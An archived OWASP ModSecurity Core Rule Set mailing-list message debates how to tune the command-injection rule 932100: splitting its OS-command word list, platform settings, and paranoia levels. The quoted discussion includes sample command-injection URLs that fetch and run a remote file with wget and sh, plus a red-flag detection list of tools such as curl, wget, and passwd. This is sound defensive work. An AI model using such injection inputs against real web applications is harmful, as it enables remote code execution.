<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<HTML>
 <HEAD>
   <TITLE> [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20Paranoia%20Mode%3A%20Controversial%0A%20candidate%20950907%20/%20932100%20%28System%20command%20injection%29&In-Reply-To=%3C20160212211715.GB32631%40elias%3E">
   <META NAME="robots" CONTENT="index,nofollow">
   <style type="text/css">
       pre {
           white-space: pre-wrap;       /* css-2.1, curent FF, Opera, Safari */
           }
   </style>
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="001908.html">
   <LINK REL="Next"  HREF="001959.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)</H1>
    <B>Christian Folini</B> 
    <A HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20Paranoia%20Mode%3A%20Controversial%0A%20candidate%20950907%20/%20932100%20%28System%20command%20injection%29&In-Reply-To=%3C20160212211715.GB32631%40elias%3E"
       TITLE="[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)">christian.folini at netnea.com
       </A><BR>
    <I>Fri Feb 12 21:17:15 UTC 2016</I>
    <P><UL>
        <LI>Previous message: <A HREF="001908.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
</A></li>
        <LI>Next message: <A HREF="001959.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#1947">[ date ]</a>
              <a href="thread.html#1947">[ thread ]</a>
              <a href="subject.html#1947">[ subject ]</a>
              <a href="author.html#1947">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>Hi there,

There has not been any additional feedback in this thread, but I think
the question is not settled as of this writing.

Thoughts?

Regs,

Christian

On Sun, Feb 07, 2016 at 08:55:30PM +0100, Christian Folini wrote:
&gt;<i> Hi there,
</I>&gt;<i> 
</I>&gt;<i> On Sat, Feb 06, 2016 at 11:04:00PM +0100, Walter Hop wrote:
</I>&gt;<i> &gt; I like the idea of splitting the file.
</I>&gt;<i> 
</I>&gt;<i> Cool.
</I>&gt;<i> 
</I>&gt;<i> &gt; I agree some of the words in os-commands.data seem rather paranoid. Words like &quot;choice&quot;, &quot;help&quot;, &quot;now&#8221; seem of low value and are common in natural text. Also, the large number of Unix-only environments could skip Windows related commands. It&#8217;s hard for users to modify these lists as you&#8217;d have to hack the CRS, and these huge collections are to maintain anyhow, so I agree we need granularity.
</I>&gt;<i> 
</I>&gt;<i> Good point.
</I>&gt;<i> 
</I>&gt;<i> &gt; The rule has some regexp magic to prevent false positives, but the balance is not a complete success in my opinion. For instance, the following URLs don't trigger in CRSv3:
</I>&gt;<i> &gt; <A HREF="http://vuln/?cmd=wget%20http://example.com/blah.txt">http://vuln/?cmd=wget%20http://example.com/blah.txt</A>
</I>&gt;<i> &gt; <A HREF="http://vuln/?cmd=sh%20blah.txt">http://vuln/?cmd=sh%20blah.txt</A>
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; So it's not as strong as you would want either to prevent some common RCE.
</I>&gt;<i> &gt; Something like <A HREF="http://vuln/?cmd=Wget%20http://example.com/;%20ecHo">http://vuln/?cmd=Wget%20http://example.com/;%20ecHo</A> does trigger it.
</I>&gt;<i> 
</I>&gt;<i> I see. Good observations.
</I>&gt;<i> 
</I>&gt;<i> &gt; 1) I think that a user should check their desired platforms in the setup conf. In fact, this would be great to do anyway in the initial 3.0.0 release even if we DON'T look at it in any rule yet. Specifying platform types will pave the way for reducing false positives and false negatives by skipping unnecessary checks and being more strict on the right platforms. So we could start by listing these platforms in the existing rule in the setup conf. Example:
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; 	SecAction \
</I>&gt;<i> &gt; 	  &quot;id:'900024', \
</I>&gt;<i> &gt; 	  phase:1, \
</I>&gt;<i> &gt; 	  t:none, \
</I>&gt;<i> &gt; 	  setvar:tx.unix=1, \
</I>&gt;<i> &gt; 	  setvar:tx.windows=1, \
</I>&gt;<i> &gt; 	  setvar:tx.java=1, \
</I>&gt;<i> &gt; 	  setvar:tx.php=1, \
</I>&gt;<i> 
</I>&gt;<i> That makes a lot of sense. At first sight.
</I>&gt;<i> 
</I>&gt;<i> I think that a default install should come with these rulesets
</I>&gt;<i> all enabled and a sysadmin can then switch them of if we is aware that
</I>&gt;<i> there is no php in his service.
</I>&gt;<i> 
</I>&gt;<i> So given the following two scenarios
</I>&gt;<i> #1 - Newbie sysadmin installs ModSec and runs into a lot of false positives
</I>&gt;<i>     because he does not disable unneeded rulesets
</I>&gt;<i> #2 - Newbie sysadmin installs ModSec and is p0wned because he does not enable
</I>&gt;<i>     the php protection
</I>&gt;<i> I strongly favour #1.
</I>&gt;<i> 
</I>&gt;<i> A vanilla install of the core rules should give you a full coverage for all
</I>&gt;<i> types of services and a decent security level. Reducing false positives by 
</I>&gt;<i> omitting certain rules (ideally rules which provide no value for your setup) 
</I>&gt;<i> is the very idea of tuning.
</I>&gt;<i> Reducing the initial number of false positives by moving certain rules
</I>&gt;<i> with a worse relationsship between added security and false positives,
</I>&gt;<i> that is the idea of the paranoia mode.
</I>&gt;<i> 
</I>&gt;<i> Chaim stated in a different message, that the rules are now organised
</I>&gt;<i> into files aimed at certain environments. So switching them off is
</I>&gt;<i> fairly easy. And there are the tags on top of it.
</I>&gt;<i> So you have tag:'language-PHP' and setting SecRuleRemoveByTag will
</I>&gt;<i> disable them all very easily. 
</I>&gt;<i> 
</I>&gt;<i> So I think, we do not need these variables.
</I>&gt;<i> 
</I>&gt;<i> &gt; (By the way: I think it&#8217;s unfortunate that a user has to use value 1 to enable a check. An undefined variable will mean that the CRS will skip some rules. This makes it dangerous to introduce a new variable in the CRS later; all existing installations MUST then add this variable to their setup rule immediately, or suffer from reduced security. It&#8217;s better to use a scheme that defaults to &#8220;on&#8221;. A convention like &#8220;tx.disable_mysql=1&#8221; would be user unfriendly and error-prone. But we could check for an explicit &#8220;off&#8221; string, e.g. &#8220;setvar:tx.mysql=off&#8221;. If it&#8217;s not &#8220;off&#8221; then assume that the user DOES want the check. I think it&#8217;s important to get this right in 3.0.0, it will be more painful to do it later.)
</I>&gt;<i> 
</I>&gt;<i> That's a very good observation. I had a similar idea once.
</I>&gt;<i> 
</I>&gt;<i> In programming, you usually start with a default value and then
</I>&gt;<i> the users overrides the default value. If he wants to.
</I>&gt;<i> 
</I>&gt;<i> I am not sure how modsecurity_crs_10_setup.conf.example is going to
</I>&gt;<i> be transformed to work seamlessly with 3.0. But this makes the
</I>&gt;<i> setting of default values a bit tricky.
</I>&gt;<i> 
</I>&gt;<i> Maybe a file REQUEST-02-DEFAULTS.conf could set default values
</I>&gt;<i> if certain variables are not set.
</I>&gt;<i> 
</I>&gt;<i> &gt; 2) Separate the words into multiple lists:
</I>&gt;<i> &gt; 	os-commands-critical.data (absolute red flag list: &quot;curl&quot;, &quot;passwd&quot;, &quot;sh&quot;, &quot;uname&quot;, &quot;wget&quot; etc.)
</I>&gt;<i> &gt; 	os-commands-paranoid.data (absolute low value, but high FP natural words like &quot;choice&quot;)
</I>&gt;<i> &gt; 	os-commands-windows.data (all Windows commands)
</I>&gt;<i> &gt; 	os-commands-common.data (all other commands)
</I>&gt;<i> 
</I>&gt;<i> Makes some sense. Too granular is difficult and you mix various
</I>&gt;<i> grouping criteria (criticality, paranoia, os), which makes is a
</I>&gt;<i> bit hard to follow. 
</I>&gt;<i> 
</I>&gt;<i> Other opinions?
</I>&gt;<i> 
</I>&gt;<i> &gt; 3) Review the current regexp against some test data and CRSv2 to make it more sensitive
</I>&gt;<i> 
</I>&gt;<i> Good plan. Maybe this could be done in a separate pull request.
</I>&gt;<i> I am afraid to overload the paranoia mode pull request... 
</I>&gt;<i> 
</I>&gt;<i> Ahoj,
</I>&gt;<i> 
</I>&gt;<i> Christian
</I>&gt;<i> 
</I>&gt;<i> 
</I>&gt;<i> -- 
</I>&gt;<i> In war you will generally find that the enemy has at any time 
</I>&gt;<i> three courses of action open to him. Of those three, he will 
</I>&gt;<i> invariably choose the fourth.
</I>&gt;<i> -- Helmuth Von Moltke
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Owasp-modsecurity-core-rule-set mailing list
</I>&gt;<i> <A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">Owasp-modsecurity-core-rule-set at lists.owasp.org</A>
</I>&gt;<i> <A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set</A>
</I>
-- 
mailto:<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">christian.folini at netnea.com</A>
<A HREF="http://www.christian-folini.ch">http://www.christian-folini.ch</A>
twitter: @ChrFolini
</PRE>







<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="001908.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
</A></li>
	<LI>Next message: <A HREF="001959.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#1947">[ date ]</a>
              <a href="thread.html#1947">[ thread ]</a>
              <a href="subject.html#1947">[ subject ]</a>
              <a href="author.html#1947">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">More information about the Owasp-modsecurity-core-rule-set
mailing list</a><br>
</body></html>
